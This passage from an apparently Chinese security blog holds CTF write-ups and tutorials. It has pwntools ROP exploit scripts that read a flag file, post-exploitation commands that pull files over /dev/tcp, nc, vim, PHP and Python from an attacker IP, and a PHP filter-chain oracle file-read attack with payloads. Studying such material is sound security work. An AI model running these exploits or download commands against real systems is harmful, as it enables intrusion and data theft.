的地址处输出到终端。 寄存器的偏移查找 1ROPgadget --binary ./libc.so.6 --only &#x27;pop|ret&#x27; ROP链就是一个正常的泄露libc基址链 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import*context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;) elf=ELF(&#x27;./vuln&#x27;)#p=remote(&quot;pwn-d929761f60.challenge.xctf.org.cn&quot;, 9999, ssl=True)p = process(&#x27;./vuln&#x27;)rdi=0x0000000000401393p.recvuntil(&quot;lets move and pwn!&quot;)payload=b&#x27;a&#x27;*(0x100+8)+p64(rdi)+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(0x4012F0)#bug()p.send(payload)libc_base=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-libc.sym[&#x27;puts&#x27;]print(hex(libc_base))rdi = libc_base+0x0000000000023b6arsi = libc_base+0x000000000002601frdx = libc_base+0x0000000000142c92rdx_r12=libc_base+0x0000000000119211rax = libc_base+0x0000000000036174ret = libc_base+0x0000000000022679syscall=libc_base+0x000000000002284dopen_=libc_base+libc.sym[&#x27;open&#x27;]read=libc_base + libc.sym[&#x27;read&#x27;]write=libc_base + libc.sym[&#x27;write&#x27;]mprotect=libc_base + libc.sym[&#x27;mprotect&#x27;]bss=0x404060+0x500 p.recvuntil(&quot;lets move and pwn!&quot;)payload=b&#x27;a&#x27;*(0x100)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(0x4012EE)#bug()p.send(payload)#pause()orw = b&#x27;/flag\\x00\\x00\\x00&#x27;orw += p64(rdi) + p64(bss) #/flag的字符串位置，要改orw += p64(rsi) + p64(0)orw += p64(open_)orw += p64(rdi) + p64(3)orw += p64(rdx_r12) + p64(0x50)*2orw += p64(rsi)+p64(bss+0x200) #读入flag的位置orw += p64(read)orw += p64(rdi) + p64(1)orw += p64(rdx_r12) + p64(0x50)*2orw += p64(rsi)+p64(bss+0x200) #读入flag的位置orw += p64(write)#pr(hex(len(orw)))p.send(orw)p.interactive() signin日常检查 12345678bbq@ubuntu:~/桌面/啊布拉布拉/11111$ checksec vuln[*] &#x27;/home/bbq/桌面/啊布拉布拉/11111/vuln&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3f7000)bbq@ubuntu:~/桌面/啊布拉布拉/11111$ 两道题几乎一样，但是这道题多了几个绕过和伪随机数绕过 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105from pwn import*import ctypescontext(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;) elf=ELF(&#x27;./vuln&#x27;)#p=remote(&quot;pwn-ecdfbe9bc0.challenge.xctf.org.cn&quot;, 9999, ssl=True)p=process(&#x27;./vuln&#x27;) def xun(): for i in range(100): #print(payload) p.recvuntil(b&#x27;Input the authentication code:&#x27;) #payload = str((elf1.rand()%100) + 1) #p.send(payload) p.send(p64(elf1.rand()%100+1)) # sleep(0.1) rdi=0x0000000000401893#gdb.attach(p)#pausep.send(b&#x27;1&#x27;)#sleep(0.5)elf1=ctypes.CDLL(&quot;./libc.so.6&quot;)#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)elf1.srand(elf1.time(0)) #与题目相同以时间为种子xun()p.sendafter(&quot;&gt;&gt; &quot;,p32(1))p.sendafter(&quot;Index: &quot;,p32(1))p.sendafter(&quot;Note: &quot;,b&#x27;a&#x27;)payload=b&#x27;a&#x27;*(0x100+8)+p64(rdi)+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(0x00000000040177B)#bug()p.send(payload)libc_base=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-libc.sym[&#x27;puts&#x27;]#print(hex(libc_base))print(&#x27;\\x1b[01;38;5;214m&#x27; + hex(libc_base) + &#x27;\\x1b[0m&#x27;)rdi = libc_base+0x0000000000023b6arsi = libc_base+0x000000000002601frdx = libc_base+0x0000000000142c92rdx_r12=libc_base+0x0000000000119211rax = libc_base+0x0000000000036174ret = libc_base+0x0000000000022679syscall=libc_base+0x000000000002284dopen_=libc_base+libc.sym[&#x27;open&#x27;]read=libc_base + libc.sym[&#x27;read&#x27;]write=libc_base + libc.sym[&#x27;write&#x27;]mprotect=libc_base + libc.sym[&#x27;mprotect&#x27;]bss=0x404060+0x500p.send(b&#x27;1&#x27;)#sleep(0.5)elf1=ctypes.CDLL(&quot;./libc.so.6&quot;)#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)elf1.srand(elf1.time(0)) #与题目相同以时间为种子xun()p.sendafter(&quot;&gt;&gt; &quot;,p32(1))p.sendafter(&quot;Index: &quot;,p32(1))p.sendafter(&quot;Note: &quot;,b&#x27;a&#x27;*0x100)#rl(&quot;lets move and pwn!&quot;)payload=b&#x27;a&#x27;*(0x100)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(0x0004013EE)#bug()p.send(payload)#pause()orw = b&#x27;/flag\\x00\\x00\\x00&#x27;orw += p64(rdi) + p64(bss) #/flag的字符串位置，要改orw += p64(rsi) + p64(0)orw += p64(open_)orw += p64(rdi) + p64(3)orw += p64(rdx_r12) + p64(0x50)*2orw += p64(rsi)+p64(bss+0x200) #读入flag的位置orw += p64(read)orw += p64(rdi) + p64(1)orw += p64(rdx_r12) + p64(0x50)*2orw += p64(rsi)+p64(bss+0x200) #读入flag的位置orw += p64(write)#print(hex(len(orw)))print(&#x27;\\x1b[01;38;5;214m&#x27; + hex(len(orw)) + &#x27;\\x1b[0m&#x27;)p.send(orw)p.interactive()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://m1racle-7.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://m1racle-7.github.io/tags/CTF/"}]},{"title":"无curl、wget下的环境来访问下载工具","slug":"无curl、wget访问下载互联网资源","date":"2024-10-09T06:51:47.714Z","updated":"2024-10-30T11:21:33.978Z","comments":true,"path":"2024/10/09/无curl、wget访问下载互联网资源/","permalink":"https://m1racle-7.github.io/2024/10/09/%E6%97%A0curl%E3%80%81wget%E8%AE%BF%E9%97%AE%E4%B8%8B%E8%BD%BD%E4%BA%92%E8%81%94%E7%BD%91%E8%B5%84%E6%BA%90/","excerpt":"","text":"记录一下无curl、wget下的环境来访问下载工具的小技巧。 ​ 最早是ISCC2024中的一道Web题《掉进阿帕奇的工资》，这道题前面就是简单的逻辑漏洞登录，登陆后存在一个异或执行命令的地方，顺利反弹shell后由于他是一个阉割版的docker，flag藏在内网中的一个服务，需要构造请求访问其路由&#x2F;flag。但是问题就是容器里面没有curl、wget、nc等命令，那么该如何请求呢？ ​ 前几天大哥向我们分享了一次实战挖洞的经历，在最后反弹shell后也是遇到了类似的问题，想向shell里面传工具的时候遇到了问题，无curl和wget。 ​ 这两次的经历也是促使我把这个技巧来总结一下。 一、使用cat​ cat命令是Linux中最常用的命令之一，主要用于读取文件并将其内容显示到标准输出。使用cat下载文件的操作如下： 攻击端：开放发送端口 12cat flag.txt | nc -lvp 7777 或nc -lvp 7777 &lt; flag.txt 只要开一个文件的传输文件的端口就行 受害者链接: 1cat &lt; /dev/tcp/192.168.20.129/7777 &gt;flag.txt 这样即可建立tcp连接读取并保存文件 注:&#x2F;dev&#x2F;tcp是bash提供的,使用前要看看shell 二、使用nc方式一：先启动接收命令 先在受害主机（192.168.20.141）上启动一个接收文件的监听： 1nc -l 3232&gt;flag.txt 而后在攻击机上往受害主机的3232端口发送数据，把恶意文件发送过去： 1nc 192.168.20.129 3232&lt; flag.txt 方式二：先启动发送命令 先在攻击机（192.168.20.129）上启动发送文件命令： 1nc -l 6666 &lt; flag.txt 而后受害主机连接攻击机，接收恶意文件： 1nc 192.168.20.129 6666 &gt; flag.txt 三、使用vimvim是从 vi 发展出来的一个文本编辑器，功能齐全且使用简单，受到广大用户的喜爱。在受害主机执行以下命令实现vim远程下载： 123456789vim -c ‘:py import vim,sys;if sys.version_info.major == 3: import urllib.request as relse: import urllib as rr.urlretrieve(“http://192.168.20.129:80/flag.txt”, “flag.txt”)vim.command(“:q!”)’ 四、使用各种编程语言下载例如上述的iscc的这道题,可以使用php -r来执行php代码来获取flag PHP payload: 1php -r ‘$c=file_get_contents(“http://192.168.20.129/flag.txt”);file_put_contents(“flag.txt”, $c);’ Python payload: 1python -c “import urllib2;open(‘evil_file.sh’,’wb’).write(urllib2.urlopen(‘http://192.168.20.129/flag.txt’).read())”。 五、其他方法对于上面的iscc这道题,当时看wp还有一种nb的方法,用的是bash中的exec命令: 1exec 4&lt;&gt; /dev/tcp/secret.host/80 &amp;&amp; echo -e &#x27;GET /flag HTTP/1.0\\n&#x27; 1&gt;&amp; 4 &amp;&amp; cat 0&lt;&amp; 4 先打开一个到 secret.host 80 端口的 TCP 连接，并将其关联到文件描述符 4,再将标准输出重定向到文件描述符 4。这样，GET 请求将被发送到已经打开的 TCP 连接,之后再cat读取文件描述符4即可得到flag. 这方法确实挺惊艳的,看来得再好好学习一下linux中的文件描述符及相关知识了","categories":[{"name":"linux","slug":"linux","permalink":"https://m1racle-7.github.io/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://m1racle-7.github.io/tags/linux/"}]},{"title":"PHP Filter链——基于oracle的文件读取攻击","slug":"PHP Filter链——基于oracle的文件读取攻击","date":"2024-10-07T13:35:38.907Z","updated":"2024-10-30T11:21:11.084Z","comments":true,"path":"2024/10/07/PHP Filter链——基于oracle的文件读取攻击/","permalink":"https://m1racle-7.github.io/2024/10/07/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/","excerpt":"","text":"简介​ 一开始见这题今年红明谷的ezphp,利用文件包含来进行测信道攻击获得flag.php的源码,接着利用匿名类来执行命令.不过最初的原题是DownUnder CTF 2022 1&lt;?php file($_POST[0]); ​ file读取一个文件，但不输出其内容.最终解法就是通过测信道攻击,用报错来预测根目录的flag的文件内容. 一.攻击原理大致分为3步: 通过iconv函数编码导致php产生内存报错 利用dechunk来确定文件第一个字符 利用能改变字节顺序的编码,利用iconv将剩余字符与第一个字符交换 1.通过编码来使PHP产生内存错误​ 众所周知,PHP Filter 当中有一种 convert.iconv 的 Filter ,可以把数据从字符集A转换成字符集B 例:php://filter/convert.iconv.&lt;source-encoding&gt;.&lt;target-encoding&gt;/resource=&lt;filename&gt; 核心:convert.iconv.L1.UCS-4LE 编码 UCS-4编码使用固定4个字节来表示每个字符,其中UCS-4LE即:使最低有效字节存储在最前面 123php -r &#x27;$string = &quot;START&quot;; echo strlen(iconv(&quot;UTF8&quot;, &quot;UCS-4LE&quot;, $string)).&quot;\\n&quot;;&#x27;输出20php -r &#x27;$string = &quot;START&quot;; echo iconv(&quot;UTF8&quot;, &quot;UCS-4LE&quot;,iconv(&quot;UTF8&quot;, &quot;UCS-4LE&quot;, $string));&#x27; | xxd ​ 在php中,php.ini的memory_limit参数代表了资源限制,默认值为128MB,如果试图读取大于128MB的文件时就会触发内存错误. 123456789&lt;?phpini_set(&#x27;memory_limit&#x27;, &#x27;128M&#x27;);$string = &quot;START&quot;;for ($i = 1; $i &lt;= 13; $i++) &#123; $string = iconv(&quot;UTF8&quot;, &quot;UCS-4LE&quot;, $string);&#125; 例如这串代码,将字符串START使用了13次UCS-4LE编码,产生内存错误 2.使文件泄露第一个字符​ 在php文档中可以找到php filter dechunk这里,其中对字符处理时有限制,只能处理a-fA-F0-9这个区间中,这是因为对于http中的chunk编码是以16进制来表长度的,所以16进制字符范围在a-fA-F0-9这个范围内. ​ 根据源码可知,php支队第一个字节进行判断,第二个字节无关紧要. 12345678php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,a&quot;));string(0) &quot;&quot;php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,g&quot;));string(1) &quot;g&quot;php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,ga&quot;));string(2) &quot;ga&quot;php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,ag&quot;));string(0) &quot;&quot; 可以发现,在使用dechunk filter时,如果我们要编码的字符第一个字节不在16进制编码范围内,php回原样输出,在范围内的话会输出为空. ​ 因为dechunk存在着判断的机制,所以我们可以利用这个机制来作为我们的oracle攻击,此外,我们开可以配合前面的convert.iconv.L1.UCS-4LE 编码,经过多段convert.iconv.L1.UCS-4LE 编码后,如果我们想要泄漏的字符串内容开头的字符范围在16进制编码范围内,因为有dechunk编码会清空字符串,就不会产生内存报错,如果不在就会继续原样输出最后导致报错. 12345678当前flag文件首字母为avar_dump(file_get_contents(&quot;php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=flag&quot;));不报错再加一层var_dump(file_get_contents(&quot;php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=flag&quot;));报错var_dump(file_get_contents(&quot;php://filter/dechunk/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=flag&quot;));不报错 所以我们目前可以判断文件中的第一个字符是否在16进制编码这个范围内了,不过现在只能判断第一个字节,接下来就是处理剩余的字节了. 3.泄露剩余字节 a.处理前4个字节​ 目前我们可以判断第一个字节了,由于我们使用的时php:&#x2F;&#x2F;filter,那么有没有一种编码可以交换字符串中的字符位置呢? 以此为目的我们可以寻找到: convert.iconv.CSUNICODE.UCS-2BE这个编码规则,将unicode转成ucs-2BE,利用这个编码规则我们可以前后交换每两个字节的位置,将他称为r2 例如: 12var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.UCS-2BE/resource=data:,abcdefgh&quot;));string(6) &quot;badcfehg&quot; 使用 convert.iconv.UCS-4LE.10646-1:1993 我们可以将每四个字节的位置逆序，我们称这个编码规则为 r4 12var_dump(file_get_contents(&quot;php://filter/convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&quot;));string(8) &quot;dcbahgfe&quot; 所以我们现在可以找到源字符串中的第一个,第二个和第四个字节,那么第三个以及其他字节呢? 对于第三个字节,我们可以先将他r2,再进行一次r4即可把c放在第一位: 12 var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.UCS-2BE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&quot;));string(8) &quot;cdabghef&quot; 这样前4个字节我们都可以判断了,但是之后的呢?似乎不能通过r2和r4规则来放到前半部分, ​ 这时我们可以想到之前的filterchain知识,利用filter协议通过各种编码规则组合来对空文件进行写入一句话木马.当时利用的是PHP再处理BASE64字符串时会完全忽略非法字符,我们可以通过一些编码规则来将非法字符添加到字符串最前端,再利用r2&#x2F;r4组合交换顺序,再利用base64decode清除非法字符即可完成把后续字符交换到前面的操作了. 例如convert.iconv.CSUNICODE.CSUNICODE 编码规则,它可以将字符串最前端加上0xff0xfe 1234567891011121314var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdef&quot;));string(8) &quot;��abcdef&quot;// 使用 r4 进行移位var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;));string(8) &quot;ba��fedc&quot;// 使用 base64 去掉冗余位var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdef&quot;));string(8) &quot;bafedQ==&quot;// 再次使用 r4 交换位置var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;));string(8) &quot;efab==Qd&quot; 不过这里还有一个问题,这里测试的时候用的是6个字节,因为r4编码规则对字节有要求,一定要4个字节为一组,所以我们需要想一些其他办法. b.对于base64两个等号的处理回顾一下上述过程,r4编码规则有两处利用点: 一个是产生填充字符后进行交换,标记为(1). 一个是利用base64消除填充字符后,标记为(2). 对于(1),对于要移位的字符串,我们尽可能让他长度满足4*n-2即可,但是我们根本不知道字符串原本长度是多少. ​ 不过好在base64编码长度都是4*n个字节,但是我们还是需要另外两个字节,因为再base64编码中,分组编码完成后,不足分组编码的会使用&#x3D;进行填充,所以我们可以利用这两个等号来进行一定的变换操作,使得其他字节不变的情况下满足4*n-2的长度条件. 题目作者找到了这个filter: 12var_dump(file_get_contents(&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7/resource=data:,==&quot;));string(24) &quot;+---AD0-3D3D+---AD0-3D3D&quot; **这个filter会固定将两个等号转换成另一个长度为24的字符串,*所以原本的字符串长度就变为 *4n-2+24 &#x3D; 4*(n+6) - 2* 也是符合了我们上述的长度要求！ 所以我们现在以abcdefghij&#x3D;&#x3D;来测试一下 12345678910111213141516// 将等号进行转换var_dump(file_get_contents(&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7/resource=data:,abcdefghij==&quot;));string(34) &quot;abcdefghij+---AD0-3D3D+---AD0-3D3D&quot;// 在前端添加冗余字符串var_dump(file_get_contents(&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdefghij==&quot;));string(36) &quot;��abcdefghij+---AD0-3D3D+---AD0-3D3D&quot;// 使用 r4var_dump(file_get_contents(&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefghij==&quot;));string(36) &quot;ba��fedcjihg---+-0DAD3D3---+-0DAD3D3&quot;// 去除冗余var_dump(file_get_contents(&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdefghij==&quot;));string(28) &quot;bafedcjihg+0DAD3D3+0DAD3Dw==&quot; 经过这4步操作后,再利用一下r4即可将e放在第一个字节上. ​ 这4步流程在作者的原本脚本上本定义为一个flip操作,也就是一个flip流程包括:等号转换,添加冗余,r4转换,去除冗余四个步骤. c.移动所有位置​ 到目前为止,我们基本解决了8字节中的1-6位置的获取,至于7-8位,我们可以先进行一次r4,然后再次重复上述流程即可获得. 但是超过8字节的位置呢? 观察之前的上述操作,我们引入了冗余字节,最后又剔除了冗余字节,实际上我们每次进行flip操作后,后续的字节都会向前移动,所以我们进行的flip次数越多,我们就能拿到距离开头越远的字符. 例如: 12345abcd efgh ijkl mn== -&gt;flip-&gt; bafe dcji hg+0 DAD3 -&gt;r4-&gt;efab ijcd 0+gh -&gt;flip-&gt;feji ba+0 dcD3 -&gt;r4-&gt;ijef 0+ab 3Dcd 这样我们就可以获得第9位的字符,我们可以观察到规律,以ij为例,每次使用flip&#x2F;r4都会使这两个字符前进4个字节位置. 所以我们可以根据这个规律,对于下标为 n 的字符，只需要进行 n&#x2F;&#x2F;4 次 flip&#x2F;r4 组合就能将其位移到字符串的前端，最后前后可以使用 r4&#x2F;r2 进行微调就行 作者的脚本中这个算法为: 12345678def get_nth(n): global flip, r2, r4 o = [] chunk = n // 2 if chunk % 2 == 1: o.append(r4) o.extend([flip, r4] * (chunk // 2)) if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2) return join(*o) d.基于base64来预测​ 但以上的所有的理论都来自于一个条件,那就是一个拥有两个等号的base64字符串,如果我们将文件内容进行base64编码后并没有两个等号的话,以上就不成立了. ​ 所以我们的目标又回到了如何不依赖文件内容、同时也不能过度修改文件内容的情况下产生一个满足要求的 Base64 字符串。 又或者说,我们有没有办法检测源文件内容经过base64编码后是否有两个等号? ​ 到目前为止,我们又有能够判断服务器的某些条件的oracle只有dechunk,我们是不是可以利用这个 Oracle 来服务其他的判断条件呢？比如此处的等号. ​ 那么有没有一种编码格式可以对数字字母都无效，但是可以把等号变成其他更长字节长度的字符，使得长度过长从而导致服务器产生内存错误呢？ ​ 于是我们大概的想法是,如果该base64编码存在等号,经过某个编码使长度无限扩大最终导致服务器内存错误;如果没有等号,那么经过编码就不会导致服务器内存错误 根据目的来寻找编码:convert.quoted-printable-encode : ​ 这个编码会将一个&#x3D;编码成&#x3D;3D,从一个字节变成了3个字节,而对其他数字字母并不会生效,这完美符合了我们的需求. 所以我们现在的做法就是： 获取 Part 1 中 n 组 convert.iconv.L1.UCS-4LE 组合会致使服务器产生内存错误的临界值 n 使用 convert.base64-encode|convert.base64-encode 两次 Base64 编码对文件内容进行编码 使用大量的 convert.quoted-printable-encode 编码对上一步 Base64 结果中的等号进行数次编码 最后拼接上 n-1 组 convert.iconv.L1.UCS-4LE 组合 ​ 按照如上步骤，如果我们通过文件内容得到的 Base64 编码中含有两个等号，则会因为后续通过大量的 convert.quoted-printable-encode 编码扩展，拼接上原本不会让服务器产生内存错误的 n-1 组 convert.iconv.L1.UCS-4LE ，致使服务器产生了内存错误；如果没有等号，即使经过 大量的 convert.quoted-printable-encode 编码扩展也不会扩展字节，拼接上 n-1 组 convert.iconv.L1.UCS-4LE 也不会产生内存错误。完美~~! ​ 不过仍有问题,此时我们拥有了判断文件内容经过两次 Bae64 之后是否有等号的 Oracle 了，但是这仅仅只是判断有等号，这种情况还包括了 1 或者 2 个等号，况且，我们最终的目的还是需要获得拥有两个 &#x3D; 的 Base64 编码，仅仅只是能判断有没有等号还是不行。 e.找到特殊的base64​ 我们再仔细回顾一下 Base64 的编码规则，等号是由于 Base64 编码填充形成的，对于等号填充形式，基本上我们有三种状态：1 个等号、2 个等号、没有等号。而其实这几种状态又是可以相互转移的，我们分别考虑： 在没有等号的情况下，字符串长度 n ，总 bit 长度为 8*n 恰好为 Base64 分组 6的倍数，此时如果我们再添加 2+3*k (k&gt;=0) 个字节即可获得 1 个等号的填充；或者再添加 1+3*k (k&gt;=0) 个字节即可获得 2 个等号的填充 在有 1 个等号的情况下，字符串长度 n ，总 bit 长度为 8*n = 6*(n+2) - 8 = 6*n +4 ，此时如果我们再添加 2+3*k (k&gt;=0) 个字节即可获得 2 个等号的填充；或者再添加 1+3*k (k&gt;=0) 个字节得到没有等号填充的状态 在有 2 个等号的情况下，我们不需要额外填充 ​ 在我们上述的oracle攻击中,无法判断原来的内容编码后有多少个等号,但是我们可以通过判断出没有等号的情况，那么我们是不是可以通过没有等号的情况，将其转移成固定有两个等号的情况呢？ 所以我们接下来我们需要找到一个可以产生 1+3*k 或者 2+3*k 字节的编码形式。 这样的话选择就有很多了,例如 convert.iconv..CSISO2022KR 编码,可以在头部添加固定字符\\x1b$)C 这时就又回到我们状态转移的问题上来了，虽然我们无法判断有几个等号，但是我们可以判断没有等号的情况，而我们知道通过之前的 Oracle ，只有没有等号的情况是无法产生报错的，而这几种状态是可以相互转移的。 所以！我们只要覆盖这三种状态，判断出哪一种是没有等号的状态，再对其进行状态转移即可： 首先通过对原内容进行编码的为状态 1 ：convert.base64-encode|convert.base64-encode 通过增加了 1 次 4 字节冗余编码的为状态 2 ：convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode 通过增加了 2 次 4 字节冗余编码的为状态 3 ：convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode 因为根据上文对 Base64 编码规则的推断，每增加一次 4 字节冗余就能使得编码状态发生相应的转移，所以无论最初的状态 1 是什么，以上三种都能覆盖等号的三种状态。 然后我们再用之前提到的 Oracle 判断其中没有等号的状态，再将其转移到有 2 个等号的状态，就必定能产生满足我们有 2 个等号的 Base64 编码了！ 原作者脚本: 12345678910111213141516171819print(&#x27;detecting equals&#x27;)j = [ req(f&#x27;convert.base64-encode|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#x27;), req(f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#123;blow_up_enc&#125;|&#123;trailer&#125;&#x27;), req(f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#x27;)]print(j)if sum(j) != 2: err(&#x27;something wrong&#x27;)if j[0] == False: header = f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;elif j[1] == False: header = f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;elif j[2] == False: header = f&#x27;convert.base64-encode|convert.base64-encode&#x27;else: err(&#x27;something wrong&#x27;)print(f&#x27;j: &#123;j&#125;&#x27;)print(f&#x27;header: &#123;header&#125;&#x27;) 4.处理剩余字节根据前三步,回顾一下我们解决了哪些问题 必定产生一个带有 2 个等号的 Base64 字符串 可以让字符串中任一字节移动到首位 可以利用 dechunk 判断字符串首位是否在 a-fA-F0-9 范围内 ​ 虽然完成了这三部分,但是我们现在只能判断字符是否在一个大概范围内,我们接下来的目的就是设法准确判断第一个字节. ​ 根据前文的思路,那么我们会想:是否存在这么一些 filter ，可以单独对每个字母生效将其转换到 a-fA-F0-9 的范围内呢？ ​ 比如假设有这么一个 1to1 的 filter ，它只对 z 字母有效，可以把 z 转换到 a 字符，对其他字母都不生效；这样一来，如果第一个字母是 z 的话，我们就可以利用这个 filter 将其转换到 a ，再利用最初的 Orcale 进行判断了，此时就不会产生内存错误；而如果不是 z 的话，就不会被转换，仍然产生内存错误。 ​ 不过要找到的话很难,我们可以退而求其次,先判断出一些字母,这些字母集合为 A ，其他另外某几个字母集合 B ，倘若有这么一个 filter 可以判断 A ∪ B ，但是因为集合 A 已经被我们排除了，所以这个 filter 尽管没有很满足我们 1to1 的要求，但是也能协助我们转换 B 集合部分的字母。 1234567rot1 = &#x27;convert.iconv.437.CP930&#x27;# 会将字母向后移动一位，所以称呼为 rot1 ，比如 a-&gt;b, b-&gt;c# 但是只对部分字母有效，初步测试为 a-h 范围，不包括数字，其他字母会有其他规则 i-&gt;q ，后续就不是 rot1 了rot13 = &#x27;string.rot13&#x27;# rot13 算法，向后移动 13 位tolower = &#x27;string.tolower&#x27;# 将大写字母转换成小写 利用string.tolower我们可以把所有大写字母转换成小写字母,这样我们只用分析小写字母和数字了 a-f由于a-f,0-9这个范围,我们可以直接通过dechunk来判断出范围. 接着通过一次rot1转换,,我们可以把f排除范围了, 12345678var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,a&quot;));string(0) &quot;&quot;var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,e&quot;));string(0) &quot;&quot;var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,f&quot;));string(1) &quot;g&quot; 接着判断a-e,由于rot1对a-e都生效,所以多次应用rot1即可逐个排除 但是我们怎么判断排除a-e之后剩下的是f呢?万一是数字呢?所以我们还需要找到一个对 f 生效，对数字不生效的 filter ，于是作者得到的 filter 如下： 12345678var_dump(file_get_contents(&quot;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,f&quot;));string(0) &quot;&quot;var_dump(file_get_contents(&quot;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,0&quot;));string(1) &quot;&quot;// ... 此处省略，该 filter 对于数字都会产生一个不可见字符var_dump(file_get_contents(&quot;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,9&quot;));string(1) &quot;&quot; 这样我们就能判断字符f了. 此处作者脚本: 12345# a-efor n in range(5): if 